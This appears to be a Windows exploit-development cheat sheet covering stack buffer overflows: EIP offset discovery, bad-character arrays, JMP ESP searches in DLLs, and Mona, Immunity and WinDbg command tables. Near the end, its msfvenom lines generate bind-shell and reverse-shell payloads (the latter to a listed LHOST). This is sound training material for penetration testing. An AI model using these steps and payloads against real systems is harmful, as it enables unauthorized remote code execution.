---
title: Windows Exploit Dev
category: Exploit Development
order: 1
---

> **Basic Stack based Buffer Overflow**

**1. Registers and Memory Addesses**

Copy the addresses in all the registers prior to and after the crash.  Determine if EIP is affected.

**2. Find the offset for EIP control**

Metasploit:
{% highlight bash %}
msf-pattern_create -l 3000
msf-pattern_offset -q 39694438 -l 3000
{% endhighlight %}

Immunity with Mona:
{% highlight bash %}
!mona config -set workingfolder C:\logs\%p
!mona pc 3000
!mona pattern_offset 0x7A46317A 
!mona suggest #automatically creates an exploit skeleton
{% endhighlight %}

**3. Find memory that you can control**

Check where the registers point to at the crash (e.g., jump to ESP) or if memory is static (jump to address)

**4.  Find the offset of where you can control vs where you can jmp to:**

{% highlight bash %}
buf = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" 
buf += "5ABCDEFGHIJK6ABCDEFGHIJK" 
buf += "7ABCDEFGHIJK8ABCDEFGHIJK"
buf += "9ABCDEFGHIJKAABCDEFGHIJK"
buf += "BABCDEFGHIJKCABCDEFGHIJK"
{% endhighlight %}

**5. Find bad characters**

Either the character won't show up or the crash is affected.

{% highlight bash %}
badchars = ( 
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
{% endhighlight %}

{% highlight bash %}
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" +"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" +"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" +"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" +"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" +"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" +"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" +"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" +"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" +"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" +"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" +"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" +"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" +"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" +"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" +"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
{% endhighlight %}

{% highlight bash %}
badchars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
{% endhighlight %}

**6. Find the opcode for the needed jmp instruction:**

nasm_shell.rb:

{% highlight bash %}
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
jmp esp
add edx, 12
{% endhighlight %}

windbg:

{% highlight bash %}
a #assemble
jmp esp #press enter twice
u #unassemble
{% endhighlight %}


**7. Find the opcode in the loaded dlls:**

windbg:

* Launch the program
* Launch windbg
* Attach to the process
* Look for non-windows DLLs at the top of the screen

{% highlight bash %}
ModLoad: 10000000 10071000   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll

> s 10000000 l 10071000  ff e4
#Find an address that doesn't contain bad characters
{% endhighlight %}

Immunity and Mona:

{% highlight bash %}
!mona modules
#Look for modules with no memory protection (e.g., DEP and ASLR)
!mona find -s '\xff\xe4' -m SLMFC.DLL
#Find an address that doesn't contain bad characters
{% endhighlight %}

**8. Create the shellcode:**

{% highlight bash %}
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp EXITFUNC=thread -f python -b "\x00\x0a\x0d" -e x86/alpha_upper -v shellcode
{% endhighlight %}

> **Mona** 

Run a Program | <code> nbd --run /path/to/program </code>
Set Working Folder | <code> !mona config -set workingfolder c:\logs\%p </code>
Set Modules to Exclude | <code> !mona config -set excluded_modules "module1.dll,module2.dll" </code>
Generate cyclic pattern | <code> !mona pc [size] </code>
Find offset | <code> po [address] </code>
find register overwritten with pattern |  <code> findmsp </code> 
Generate bytes from 0x00 to 0xff excluding badchars | <code>  bytearray -b [badchars] </code> 
find a jump point | <code> jmp -r [register] </code> 
skip modules that start with 0x00 | <code> -n </code> 
skip os modules | <code> -o </code>  
Module | <code> -m </code>
Module property | <code> -cm </code>
filter bad chars | <code> -cpd  </code>

**Additional Resources**

* [Mona Manual](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

> **Debuggers: Immunity** 

Go to a memory address|  Right Click → Go to → Expression (Ctrl+G)
Breakpoint | F2
Step | F7
Exec till Return | Ctrl+F9
Run | F9
Pause | F12

**Additional Resources**

* [Immunity](https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982)

> **Debuggers: WINDBG** 

Start windbg with save layout | <code> windbg -QY C:\path\executable argument </code>
Set breakpoint at Main | <code> Bp vuln_app!main </code>
Set a breakpoint at addres | <code> Bp [address] </code>
list breakpoints | bl 
View stack | u
Dump/Dispaly EDP | dd ebp
Display 2 32bit values pointed to by EBP | <code>  Dp ebp L2 </code>
Display value pointed to by EBP | Dd poi(ebp)
Display segment information by the fs register | Dg fs
Display structure of the peb in nt moduel | </code> Dt nt!_peb </code>
view exception chain | <code> !exchain </code>
pass exception/continue/run | g  
Step | t
step | gN
Step Over | p
Find Location of Function | X executableName!FunctionName
Disassemble at Address | u [address]  
Disassemble code at return address | u poi(ebp+4)
Evaluate Expression | <code> ?esp+100 #value of ESP plus 0x100 </code>
load python |  <code> .load pykd.pyd </code> 
exceute mona stuff | <code> !py mona [command] [args] </code>
Find instruction from opcode | <code> a [enter] jmp esp [enter] [enter] </code>
Find instruction from opcode | <code> u [address from above] </code>
Open Executable | CTRL+E
Attach to process | F6
Memory | Alt+5
Close Window | Ctrl+F4
Restart | Ctrl+Shift+F5
Break | Ctrl+Break

> **Shellcode** 

{% highlight bash %}
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.37.1 LPORT=4321  -b '\x00\x09\x0a' -f python
{% endhighlight %}




